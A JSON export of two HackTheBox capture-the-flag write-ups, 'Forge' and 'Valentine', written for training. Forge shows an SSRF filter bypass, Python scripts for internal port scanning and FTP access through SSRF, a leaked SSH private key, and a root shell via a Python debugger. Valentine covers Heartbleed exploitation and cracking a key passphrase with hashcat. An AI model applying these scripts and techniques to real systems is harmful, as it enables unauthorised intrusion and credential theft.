[ { "title": "Forge [HTB]", "url": "/posts/forge/", "categories": "Writeups", "tags": "htb, medium, linux", "date": "2022-03-06 09:00:00 +0100", "snippet": "ForgeForge is a medium linux machine on HackTheBox and is today’s target.ReconAs always, we start with network discovery with a nmap scan.#nmap -sC -sV -p- 10.129.190.159 -vvPORT STATE SERVICE REASON VERSION21/tcp filtered ftp no-response22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2sK9Bs3bKpmIER8QElFzWVwM0V/pval09g7BOCYMOZihHpPeE4S2aCt0oe9/KHyALDgtRb3++WLuaI6tdYA1k4bhZU/0bPENKBp6ykWUsWieSSarmd0sfekrbcqob69pUJSxIVzLrzXbg4CWnnLh/UMLc3emGkXxjLOkR1APIZff3lXIDr8j2U3vDAwgbQINDinJaFTjDcXkOY57u4s2Si4XjJZnQVXuf8jGZxyyMKY/L/RYxRiZVhDGzEzEBxyLTgr5rHi3RF+mOtzn3s5oJvVSIZlh15h2qoJX1v7N/N5/7L1RR9rV3HZzDT+reKtdgUHEAKXRdfrff04hXy6aepQm+kb4zOJRiuzZSw6ml/N0ITJy/L6a88PJflpctPU4XKmVX5KxMasRKlRM4AMfzrcJaLgYYo1bVC9Ik+cCt7UjtvIwNZUcNMzFhxWFYFPhGVJ4HC0Cs2AuUC8T0LisZfysm61pLRUGP7ScPo5IJhwlMxncYgFzDrFRig3DlFQ0=| 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH67/BaxpvT3XsefC62xfP5fvtcKxG2J2di6u8wupaiDIPxABb5/S1qecyoQJYGGJJOHyKlVdqgF1Odf2hAA69Y=| 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILcTSbyCdqkw29aShdKmVhnudyA2B6g6ULjspAQpHLIC80/tcp open http syn-ack Apache httpd 2.4.41|_http-title: Did not follow redirect to http://forge.htb| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: Host: 10.129.190.159; OS: Linux; CPE: cpe:/o:linux:linux_kernelHTTP - Port 80Searching for subdomains with wfuzz=====================================================================ID Response Lines Word Chars Payload =====================================================================000000024: 200 1 L 4 W 27 Ch &quot;admin&quot; 000009532: 400 12 L 53 W 427 Ch &quot;#www&quot; 000010581: 400 12 L 53 W 427 Ch &quot;#mail&quot; 000047706: 400 12 L 53 W 427 Ch &quot;#smtp&quot; 000103135: 400 12 L 53 W 427 Ch &quot;#pop3As the previous nmap scan told us, the webapp is accessible through its domain name : http://forge.htb and http://admin.forge.htb, we need to add the host to /etc/hosts.Domain : forge.htbLooking for subdirectories with gobuster===============================================================2021/11/28 21:03:14 Starting gobuster in directory enumeration mode===============================================================/uploads (Status: 301) [Size: 224] [--&amp;gt; http://forge.htb/uploads/]/static (Status: 301) [Size: 307] [--&amp;gt; http://forge.htb/static/] /upload (Status: 200) [Size: 929] The webapp has an upload image feature in /upload, where we can upload an image through two different methods : local file or url.Javascript source codefunction show_upload_local_file(argument) { var form_div = document.getElementById(&#39;form-div&#39;); form_div.innerHTML = ` &amp;lt;form action=&quot;/upload&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&amp;gt; &amp;lt;input type=&quot;file&quot; name=&quot;file&quot; class=&quot;file&quot;&amp;gt; &amp;lt;input name=&quot;local&quot; type=&quot;hidden&quot; value=&#39;1&#39;&amp;gt; &amp;lt;br&amp;gt; &amp;lt;br&amp;gt; &amp;lt;button id=&quot;submit-local&quot; type=&quot;submit&quot; class=&quot;submit&quot;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; `;}function show_upload_remote_file(argument) { var form_div = document.getElementById(&#39;form-div&#39;); form_div.innerHTML = ` &amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;form action=&quot;/upload&quot; method=&quot;POST&quot; enctype=&quot;application/x-www-form-urlencoded&quot; &amp;gt; &amp;lt;input type=&quot;textbox&quot; name=&quot;url&quot; class=&quot;textbox&quot;&amp;gt; &amp;lt;input name=&quot;remote&quot; type=&quot;hidden&quot; value=&#39;1&#39;&amp;gt; &amp;lt;br&amp;gt; &amp;lt;br&amp;gt; &amp;lt;button id=&quot;submit-remote&quot; type=&quot;submit&quot; class=&quot;submit&quot;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; `;}When uploading an image through local file, the webapp change the filename to a random string and displays the path where the file has been stored.eg: http://forge.htb/uploads/JWknEqSGbTqCPncyFD7DWhen trying to upload an image through url, the server displays an error message like :An error occured! Error : HTTPSConnectionPool(host=&#39;img1.freepng.fr&#39;, port=443): Max retries exceeded with url: /20180330/yfq/kisspng-tux-racer-t-shirt-linux-kernel-linux-5abe16231f3e90.888396341522406947128.jpg (Caused by NewConnectionError(&#39;&amp;lt;urllib3.connection.HTTPSConnection object at 0x7f903482eb80&amp;gt;: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution&#39;))When a web server tries to request an URL the user has the control of, it could be interesting to check for Server-Side Request Forgery (SSRF).Requesting 127.0.0.1 -&amp;gt; Invalid protocol! Supported protocols: http, httpsRequesting http://127.0.0.1 -&amp;gt; URL contains a blacklisted address!The server has some filters we could try to bypass :PayloadAllTheThings - CSRFhttp://[::]:80/ yields a good response from the server in a form of a url with a random filename just like it did with local file upload.The server cannot display the image because the result is not an image BUT it is the HTTP response from the server request.We can download it with wget and display the content in our terminal.Knowing the SSRF is present, we could try to scan internal port to see if potential vulnerable services are running.Port scanning through SSRFimport requestsimport timefrom bs4 import BeautifulSoupurl = &#39;http://forge.htb/upload&#39;print(&#39;Starting scan...&#39;)for port in range(1,65535): data = {&#39;url&#39;:&#39;http://[::]:{}&#39;.format(port),&#39;remote&#39;:1} r = requests.post(url,data=data) soup = BeautifulSoup(r.text,&#39;html.parser&#39;) if len(str(soup.find_all(&#39;center&#39;)[1])) &amp;lt; 304 or len(str(soup.find_all(&#39;center&#39;)[1])) &amp;gt; 309: print(&#39;Port {} -&amp;gt; {}&#39;.format(port,soup.find_all(&#39;center&#39;)[1]))Result (false positive)python3 csrf_scan.py 130 ⨯Starting scan...Port 22 -&amp;gt; &amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;An error occured! Error : (&#39;Connection aborted.&#39;, BadStatusLine(&#39;SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3\\r\\n&#39;))&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;Port 80 -&amp;gt; &amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;File uploaded successfully to the following url:&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;Port 37820 -&amp;gt; &amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;An error occured! Error : (&#39;Connection aborted.&#39;, BadStatusLine(&#39;GET / HTTP/1.1\\r\\n&#39;))&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;Port 37820 gives a response but it was a false positive, othen than that all ports except the one we saw in nmap are closed.The server can also request our own python3 HTTP server.python3 -m http.serverServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...10.129.190.159 - - [28/Nov/2021 21:09:16] &quot;GET / HTTP/1.1&quot; 200 -We can create a small python3 server that will redirect traffic to the target to bypass some restrictions like protocols used (gopher,file,…)#!/usr/bin/env python3import sysfrom http.server import HTTPServer, BaseHTTPRequestHandlerif len(sys.argv)-1 != 2: print(&quot;&quot;&quot;Usage: {} &amp;lt;port_number&amp;gt; &amp;lt;url&amp;gt; &quot;&quot;&quot;.format(sys.argv[0])) sys.exit()class Redirect(BaseHTTPRequestHandler): def do_GET(self): self.send_response(302) self.send_header(&#39;Location&#39;, sys.argv[2]) self.end_headers() def send_error(self, code, message=None): self.send_response(302) self.send_header(&#39;Location&#39;, sys.argv[2]) self.end_headers()HTTPServer((&quot;&quot;, int(sys.argv[1])), Redirect).serve_forever()Running it with : python3 redirect.py 4444 &quot;gopher://127.0.0.1&quot;The server answers with a different error, not erroring on protocolsAn error occured! Error : No connection adapters were found for &#39;gopher://127.0.0.1&#39;This error seems to be linked to our python3 web server and is not giving much result. Let’s check the other subdomain.Domain : admin.forge.htbThe server only displays a sentence : Only localhost is allowedWe could be able to request this subdomain using the SSRF on forge.htbWhen trying to send the payload : http://admin.forge.htb, the server answers with URL contains a blacklisted address! but a payload like : http://admin.Forge.htb (with a capital letter) seems to bypass the restriction.We download the file and display the content :admin.forge.htb&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Admin Portal&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&amp;gt; &amp;lt;header&amp;gt; &amp;lt;nav&amp;gt; &amp;lt;h1 class=&quot;&quot;&amp;gt;&amp;lt;a href=&quot;/&quot;&amp;gt;Portal home&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right margin-right&quot;&amp;gt;&amp;lt;a href=&quot;/announcements&quot;&amp;gt;Announcements&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right&quot;&amp;gt;&amp;lt;a href=&quot;/upload&quot;&amp;gt;Upload image&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;/nav&amp;gt; &amp;lt;/header&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;Welcome Admins!&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; Using the same method, we can check /announcements page.admin.forge.htb/announcements&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Announcements&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/announcements.css&quot;&amp;gt; &amp;lt;header&amp;gt; &amp;lt;nav&amp;gt; &amp;lt;h1 class=&quot;&quot;&amp;gt;&amp;lt;a href=&quot;/&quot;&amp;gt;Portal home&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right margin-right&quot;&amp;gt;&amp;lt;a href=&quot;/announcements&quot;&amp;gt;Announcements&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right&quot;&amp;gt;&amp;lt;a href=&quot;/upload&quot;&amp;gt;Upload image&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;/nav&amp;gt; &amp;lt;/header&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;ul&amp;gt; &amp;lt;li&amp;gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&amp;lt;/li&amp;gt; &amp;lt;li&amp;gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.&amp;lt;/li&amp;gt; &amp;lt;li&amp;gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&amp;amp;lt;url&amp;amp;gt;.&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; We now have some credentials to an internal FTP serveruser:heightofsecurity123!and also a tutorial on how to upload file on the admin subdomain using the /upload endpoint.admin.forge.htb/upload&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Upload an image&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body onload=&quot;show_upload_local_file()&quot;&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&amp;gt; &amp;lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/upload.css&quot;&amp;gt; &amp;lt;script type=&quot;text/javascript&quot; src=&quot;/static/js/main.js&quot;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;header&amp;gt; &amp;lt;nav&amp;gt; &amp;lt;h1 class=&quot;&quot;&amp;gt;&amp;lt;a href=&quot;/&quot;&amp;gt;Portal home&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right margin-right&quot;&amp;gt;&amp;lt;a href=&quot;/announcements&quot;&amp;gt;Announcements&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;h1 class=&quot;align-right&quot;&amp;gt;&amp;lt;a href=&quot;/upload&quot;&amp;gt;Upload image&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt; &amp;lt;/nav&amp;gt; &amp;lt;/header&amp;gt; &amp;lt;center&amp;gt; &amp;lt;br&amp;gt;&amp;lt;br&amp;gt; &amp;lt;div id=&quot;content&quot;&amp;gt; &amp;lt;h2 onclick=&quot;show_upload_local_file()&quot;&amp;gt; Upload local file &amp;lt;/h2&amp;gt; &amp;lt;h2 onclick=&quot;show_upload_remote_file()&quot;&amp;gt; Upload from url &amp;lt;/h2&amp;gt; &amp;lt;div id=&quot;form-div&quot;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/center&amp;gt; &amp;lt;br&amp;gt; &amp;lt;br&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; Through the SSRF on the main domain, we can upload a file on the /upload endpoint of admin.forge.htb, doing so result in the main domain giving us a response containing the response of admin.forge.htb telling us the file has been uploaded correctly and a path is diplayed.url=http://admin.Forge.htb/upload?u=http://10.10.14.70:8000/poc.php&amp;amp;remote=1Even though this little trick is fun, it is not useful.We can access the internal ftp server through the endpoint :url=http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@Forge.htb&amp;amp;remote=1Python script to automate ssrf payloadimport requestsimport cmdfrom bs4 import BeautifulSoupdef send_ssrf(path): url = &#39;http://forge.htb/upload&#39; ftp = &#39;http://admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb{}&#39;.format(path) data={&#39;url&#39;:ftp, &#39;remote&#39;:1} r = requests.post(url,data=data) soup = BeautifulSoup(r.text,&#39;html.parser&#39;) response_url = soup.find_all(&#39;a&#39;)[2].contents r = requests.get(response_url[0]) print(r.text)class Exploit(cmd.Cmd): prompt = &#39;ftp &amp;gt; &#39; def default(self,arg): send_ssrf(arg) def do_exit(self,arg): exit()Exploit().cmdloop()The result diplayed is the directory served by the ftp serverftp &amp;gt; /drwxr-xr-x 3 1000 1000 4096 Aug 04 19:23 snap-rw-r----- 1 1000 1000 33 Nov 29 20:26 user.txtInitial FootholdWe have to understand that this is a HOME FOLDER and we can’t see hidden directories like .ssh, but if we request it….we find the private key pair.python3 ssrf_exploit.pyftp &amp;gt; /.ssh/id_rsa-----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----The private key does not have a passphrase, we can connect to the serverssh user@forge.htb -i id_rsaLocal Privilege EscalationNow we need to find a way to escalate our privilege to root user.The command sudo -l gives us a very interesting result.Matching Defaults entries for user on forge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py/opt/remote-manager.py (-rwxr-xr-x 1 root root)#!/usr/bin/env python3import socketimport randomimport subprocessimport pdbport = random.randint(1025, 65535)try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind((&#39;127.0.0.1&#39;, port)) sock.listen(1) print(f&#39;Listening on localhost:{port}&#39;) (clientsock, addr) = sock.accept() clientsock.send(b&#39;Enter the secret passsword: &#39;) if clientsock.recv(1024).strip().decode() != &#39;secretadminpassword&#39;: clientsock.send(b&#39;Wrong password!\\n&#39;) else: clientsock.send(b&#39;Welcome admin!\\n&#39;) while True: clientsock.send(b&#39;\\nWhat do you wanna do: \\n&#39;) clientsock.send(b&#39;[1] View processes\\n&#39;) clientsock.send(b&#39;[2] View free memory\\n&#39;) clientsock.send(b&#39;[3] View listening sockets\\n&#39;) clientsock.send(b&#39;[4] Quit\\n&#39;) option = int(clientsock.recv(1024).strip()) if option == 1: clientsock.send(subprocess.getoutput(&#39;ps aux&#39;).encode()) elif option == 2: clientsock.send(subprocess.getoutput(&#39;df&#39;).encode()) elif option == 3: clientsock.send(subprocess.getoutput(&#39;ss -lnt&#39;).encode()) elif option == 4: clientsock.send(b&#39;Bye\\n&#39;) breakexcept Exception as e: print(e) pdb.post_mortem(e.__traceback__)finally: quit()This script will create a socket listening on 127.0.0.1 with a random port, and after connecting to it, it will ask for a password and if the password is right, access some commands.An interesting module used here is pdb. This module is the Python Debugger and is used to…well…debug program.If we submit an error somewhere in the program, the except will trigger and we will have access to the debugger command line.When the program asks for a choice, it is not veryfing our input and thus we can send something the program is not expecting.Now that we have access to the Pdb command line, looking at the document here :https://docs.python.org/3/library/pdb.htmlWe see the p commandThis command will exec the expression we input.p expressionEvaluate the expression in the current context and print its valueWe can execute shell command by using the subprocess module.(Pdb) p subprocess.run([&quot;whoami&quot;])root(Pdb) p subprocess.run([&quot;bash&quot;])root@forge:/home/user# cat /root/root.txtREDACTEDWe are now root.ConclusionThis machine was very interesting, and made me practice some python scripting and learning new web vulnerability. The difficulty was fair and I hope to find more machines like that." }, { "title": "Valentine [HTB]", "url": "/posts/valentine/", "categories": "Writeups", "tags": "htb, easy, linux", "date": "2021-12-22 18:00:00 +0100", "snippet": "ValentineValentine is an easy linux machine on HackTheBox. It is the third box in the OSCP learning series. Let’s not waste more time and start right away.ReconnaissanceWe start with the usual nmap TCP SYN scan to find services.sudo nmap -sS -sV -p- 10.129.180.245 -oA scan/valentine_tcp_scan -vvPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 63 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOpenSSH and a web server listening on both HTTP and HTTPS are available.HTTP - Port 80Landing on a page with a single .jpg file displayed. Not very interesting at first glance. We can check the HTML source code to find more information but nothing there.We continue to do some enumeration with directory bruteforcing.gobuster dir -u http://10.129.180.245/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php===============================================================2021/12/21 21:31:43 Starting gobuster in directory enumeration mode===============================================================/index.php (Status: 200) [Size: 38]/index (Status: 200) [Size: 38]/dev (Status: 301) [Size: 314] [--&amp;gt; http://10.129.180.245/dev/]/encode.php (Status: 200) [Size: 554] /encode (Status: 200) [Size: 554] /decode (Status: 200) [Size: 552] /decode.php (Status: 200) [Size: 552] /omg (Status: 200) [Size: 153356] Interesting /dev directory with two files hype_key and notes.txt.notes.txtTo do:1) Coffee.2) Research.3) Fix decoder/encoder before going live.4) Make sure encoding/decoding is only done client-side.5) Don&#39;t use the decoder/encoder until any of this is done.6) Find a better way to take notes.It does not reveal so much information about what to do next.The hype_key is a big string of what looks like hexadecimal characters. They can be decoded easily using Cyberchef which gives us a RSA PRIVATE KEY.-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI60EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXiEbw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8POXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGdpHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SHQdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+Ep0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uCOl6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulOt9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDKaAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1EAloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Qr08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPkye1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CCdYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuXcY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpYpnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAjMslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qLsuLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEWl0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzTRUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3-----END RSA PRIVATE KEY-----We know the private key has a passphrase because of the line Proc-Type: 4,ENCRYPTED.We might be able to crack it.First, we use a john script to convert the private key into a format understandable by john and hashcat./usr/share/john/ssh2john.py PRIV_KEY &amp;gt; PRIV_KEY.johnThen we execute our favorite password cracking software using the right format. I am using hashcat on my host to benefit from my GPU’s power.hashcat -m 22931 PRIV_KEY.john rockyou.txtUnfortunately, the passphrase doesn’t seem to be in the rockyou wordlist.We need to further enumerate the host to find information./encode and /decode are two features which encode and decode a string in base64. After trying multiple command injection, it doesn’t seem vulnerable.HTTPS - Port 443The web application is the same but with the SSL/TLS protocol to secure communication.We can check how the SSL/TLS protocol is handled by the server using testssl. This command will check for protocols offered, ciphers used and potential vulnerabilities on the server.The server is vulnerable to Heartbleed (CVE-2014-0160), a critical vulnerability in OpenSSL 1.0.1.This vulnerability allow an attacker to read server or client memory in order to get sensitive information like private keys.The flaw lies in the Heartbeat protocol, a sort of keep-alive system between client and server. The client can send a small string to check if the server is still alive, and if it is, the server must send the same payload back. The problem is that the payload length is not verified and an attacker can therefore send a small string with a big payload length resulting in the server answering too much information. More information is avaiable on the official website : https://heartbleed.com/For the exploit, I used this python script : heartbleed-poc.pyThe script leave a dump.bin file containing some information leak.B@@�CBSC[��{rK�L�+��H�Ͻ9D�V�C��wD3��@@f�T��&quot;�!@9@8@�@��O�E@5@��R�\\�[@V@S�M�C@�S� 